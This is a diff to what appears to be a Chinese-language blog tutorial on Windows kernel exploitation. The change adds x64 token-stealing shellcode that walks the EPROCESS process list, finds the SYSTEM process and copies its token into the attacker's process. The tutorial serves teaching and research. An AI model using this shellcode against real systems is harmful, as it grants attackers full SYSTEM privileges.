@@ -598,7 +598,43 @@ nt authority/system
     
     而 _EPROCESS 的另外一個欄位 UniqueProcessId (PID) 位址即為 ```Flink 欄位的位址 - 8```，這代表如果我們讀取每個 Flink 的位址 - 8 的值，就可以一邊走一邊比對 PID 來找尋 system 和 cmd.exe 的 _EPROCESS 結構了。
 
-    接下來，我們先著手寫模擬的 shellcode 吧，
+    整理一下流程:
+    ![ref7](https://lompandi.github.io/posts/post3/imgs/fetching_eprocess%20final.png)
+
+    接下來，我們先著手完成 shellcode 吧!
+    
+    ```
+    mov rdx, gs:[0x188]     ; 0x180 + 0x8 = 0x188 -> CurrentThread pointer
+    mov rdx, [rdx + 0xb8]   ; 0x98 + 0x20 = 0xb8  -> Process Pointer
+    mov r9,  [rdx + 0x448]  ; EPROCESS + 0x448 -> Flink address field
+    mov rcx, r9             ; Flink Address
+    
+    ; iterate through ActiveProcessLinks to find system process via its pid (4)
+    srch_for_sys:
+    mov rdx, [rcx - 8]
+    cmp rdx, 4
+    jz out1
+    mov rcx, [rcx]          ; Continue to iterate through ActiveProcessLinks
+    jmp srch_for_sys
+    
+    ;we found system process (pid = 4)
+    out1:
+    mov rax, [rcx + 0x70]   ; ActiveProcessLinks + 0x70 = Token field address，copy token value to rax
+    
+    ; iterate through ActiveProcessLinks to find our process via pid
+    srch_our_proc:
+    mov rdx, [rcx - 8]
+    cmp rdx, <our process id>
+    jz final
+    mov rcx, [rcx]
+    jmp srch_our_proc
+    
+    ; we found our process, modify the token value
+    final:
+    mov [rcx + 0x70], rax       ;modify the token to system's
+    ```
+    
+    
     
     當然，Kernel 做為一個系統中重要的物件，自然不會乖乖站在那邊給你打，Kernel Mode 有一套有別於 User Mode     的保護，最常見的有下列幾項:
 
